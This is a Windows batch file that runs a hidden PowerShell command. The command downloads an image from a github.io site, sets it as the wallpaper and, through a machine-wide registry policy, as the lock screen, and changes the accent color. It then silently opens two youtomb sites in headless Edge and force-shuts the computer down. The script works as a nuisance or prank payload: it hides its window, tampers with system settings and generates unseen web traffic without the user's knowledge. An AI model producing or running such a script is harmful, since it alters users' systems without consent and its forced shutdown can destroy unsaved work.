@echo off
powershell -WindowStyle Hidden -Command ^
  "$imgUrl='https://cmd-hue.github.io/coinslot/og.png';" ^
  "$imgPath='$env:USERPROFILE\Pictures\coinslot_og.png';" ^
  "Invoke-WebRequest -Uri $imgUrl -OutFile $imgPath;" ^
  "[System.Reflection.Assembly]::LoadWithPartialName('System.Runtime.InteropServices') | Out-Null;" ^
  "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(""user32.dll"", SetLastError=true)] public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }';" ^
  "[Wallpaper]::SystemParametersInfo(20,0,$imgPath,3) | Out-Null;" ^
  "New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization' -Force | Out-Null;" ^
  "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Personalization' -Name LockScreenImage -Value $imgPath;" ^
  "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\DWM' -Name AccentColor -Value 0xff6100;" ^
  "Start-Process 'msedge.exe' '--headless --disable-gpu --dump-dom https://youtomb.github.io';" ^
  "Start-Process 'msedge.exe' '--headless --disable-gpu --dump-dom https://youtomb-mobile.github.io';" ^
  "Stop-Computer -Force"
